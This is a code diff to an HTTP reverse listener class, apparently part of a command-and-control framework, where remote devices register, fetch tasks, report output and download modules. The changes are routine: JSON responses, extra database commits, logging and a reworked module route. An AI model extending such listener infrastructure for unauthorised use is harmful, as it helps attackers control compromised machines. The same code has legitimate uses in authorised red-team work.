@@ -29,6 +29,7 @@ class Listener(BaseListener):
     name = "http-reverse"
     description = "Reverse HTTP Listener"
     author: str = "Screamz2k"
+    protocol: str = "http"
     os = ["linux", "windows", "osx"]
     options = DefaultListenerPool(
         [
@@ -99,7 +100,7 @@ class Listener(BaseListener):
             Session.commit()
             log_connection(device)
             self.add_handler(Handler(device, self))
-            return device.name
+            return jsonify({"name": device.name})
 
         @self.api.route("/tasks/<string:name>")
         def get_tasks(name: str = None):
@@ -145,6 +146,7 @@ class Listener(BaseListener):
                 return "", 404
 
             task.finish(output, success)
+            Session.commit()
             return "", 200
 
         @self.api.route("/update/<string:name>", methods=["POST"])
@@ -156,7 +158,7 @@ class Listener(BaseListener):
             handler = self.get_handler(name)
             if handler is None:
                 return "", 404
-
+                
             data: dict = request.get_json()
             task_id = data.get("id", "")
             output = data.get("output", "")
@@ -167,6 +169,11 @@ class Listener(BaseListener):
 
             task.output = output
             Session.commit()
+            LogEntryModel.log(
+                "info",
+                "listeners",
+                f"Updated output of task {task_id} for device {name}",
+            )
             return "", 200
 
         @self.api.route("/download/<string:file_name>", methods=["GET"])
@@ -180,8 +187,9 @@ class Listener(BaseListener):
                 as_attachment=True,
             )
 
-        @self.api.route("/module/<string:path>", methods=["GET"])
-        def get_module_info(path: str = None):
+        @self.api.route("/module/", methods=["GET"])
+        def get_module_info():
+            path = request.args.get("path", "")
             if path is None:
                 return "", 404
             try:
@@ -191,10 +199,10 @@ class Listener(BaseListener):
             if module is None:
                 return "", 404
 
-            return jsonify(module.to_dict())
+            return jsonify(module.to_dict(self.commander))
 
         @self.api.route("/module/download", methods=["GET"])
-        def download_module_content(path: str = None):
+        def download_module_content():
             task_name = request.args.get("name", "")
 
             task: TaskModel = Session.query(TaskModel).filter_by(name=task_name).first()
